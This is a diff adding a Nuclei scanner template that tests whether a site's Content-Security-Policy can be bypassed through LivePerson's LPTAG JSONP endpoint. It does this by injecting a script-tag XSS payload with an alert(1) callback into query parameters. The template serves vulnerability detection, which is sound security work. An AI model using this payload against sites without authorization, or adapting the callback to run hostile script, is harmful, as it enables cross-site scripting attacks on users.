@@ -1,0 +1,55 @@
+id: liveperson-lptag-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - LivePerson LPTAG
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,liveperson-lptag,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "liveperson.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: liveperson_lptag_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "liveperson_lptag_csp_xss == true"
+# digest: 490a00463044022079c340ff78cd4188a280b1938ac95afd35f9ee1127076cb18aece86a2084620802204e069aae55db8d54d584800f2b77c7577c2cc651b5f8c1f75e034093c6576e05:922c64590222798bb761d5b6d8e72950
